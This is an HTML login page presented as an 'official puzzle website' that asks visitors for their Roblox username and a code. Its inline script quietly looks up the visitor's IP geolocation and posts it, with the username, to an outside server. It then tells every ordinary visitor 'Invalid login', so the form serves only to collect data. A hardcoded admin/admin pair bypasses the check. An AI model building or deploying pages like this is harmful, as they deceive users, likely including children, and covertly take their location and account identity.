<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="Content-Language" content="en" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Login</title>
    <link rel="icon" type="image/png" href="puzzle_3838725.png" />
    <link rel="stylesheet" href="login.css" />
</head>
<body>
    <div class="container">
        <form id="loginForm">
            <picture><img src="puzzle_3838725.png" alt="puzzle" /></picture>

            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter roblox username" required />
            <br />

            <label for="code">Code:</label>
            <input type="password" id="code" name="code" placeholder="Enter code" required />
            <br />

            <input type="submit" value="Login" />
        </form>
    </div>

    <footer>
        <p>&copy; <span id="year"></span> official puzzle website</p>
    </footer>

    <script>
        async function sendData(username) {
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();

                const response = await fetch('https://puzzle-server-0l4i.onrender.com/info', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ UserId: username, ipInfo: ipData })
                });

                if (!response.ok) {
                    throw new Error('Backend response not ok: ' + response.status);
                }
                
                return await response.json();
            } catch (err) {
                console.error('Fout bij versturen data of ophalen IP:', err);
                return { success: false, error: err.message };
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function (event) {
            event.preventDefault();

            const username = document.getElementById('username').value.trim();
            const code = document.getElementById('code').value.trim();

            if (!username || !code) {
                alert('Please fill in both fields.');
                return;
            }

            // Voor admin login - ALLEEN ALERT, GEEN REDIRECT
            if (username === 'admin' && code === 'admin') {
                alert('Welcome to the website!');
                return; // Stop hier, ga niet door naar sendData
            }

            // Alleen voor normale users - verstuur data naar server
            await sendData(username);
            alert('Invalid login');
        });

        document.getElementById('year').textContent = new Date().getFullYear();
    </script>
</body>
</html>